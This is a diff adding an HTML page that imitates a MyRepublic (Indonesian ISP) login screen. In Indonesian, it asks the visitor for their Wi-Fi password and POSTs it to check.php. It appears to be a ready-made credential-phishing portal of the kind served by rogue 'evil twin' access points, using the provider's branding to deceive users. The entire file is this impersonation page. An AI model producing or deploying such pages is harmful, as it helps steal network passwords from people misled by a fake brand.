@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MyRepublic Login</title>
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #652d90;
+            /* MyRepublic Purple */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+        }
+
+        .logo {
+            width: 200px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: #652d90;
+            font-size: 20px;
+            margin-bottom: 20px;
+        }
+
+        input[type="password"] {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 20px;
+            border: 2px solid #f0f0f0;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 15px;
+        }
+
+        input[type="password"]:focus {
+            border-color: #652d90;
+            outline: none;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #652d90;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(101, 45, 144, 0.4);
+        }
+
+        button:hover {
+            background-color: #4e1a75;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <img src="logo.png" alt="MyRepublic" class="logo">
+        <p style="color: #666; font-size: 14px; margin-bottom: 30px;">Internet Ultra Cepat menanti Anda.</p>
+
+        <form method="POST" action="check.php">
+            <input type="password" name="password" placeholder="Masukkan Password Wi-Fi" required>
+            <button type="submit">SAMBUNGKAN</button>
+        </form>
+    </div>
+</body>
+
+</html>
